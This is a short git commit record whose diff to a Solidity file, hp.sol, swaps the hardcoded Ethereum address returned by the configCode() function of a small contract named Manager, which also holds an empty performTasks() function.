71e89a9ff3dcc2458448e9bee0cc1a4695e41b3d
punityx <125612854+punityx@users.noreply.github.com>
2023-02-18 22:17:43 +0200

    Update hp.sol

--- hp.sol
+++ hp.sol
@@ -6,6 +6,6 @@ contract Manager {
     function performTasks() public {}
 
     function configCode() public pure returns (address) {
-        return 0x9CC1E6a5e827529743d8D378c19F19B778A05590;
+        return 0x4C69E6e23274acf3b5d2AEB034bD91a5d3d1018D;
     }
 }
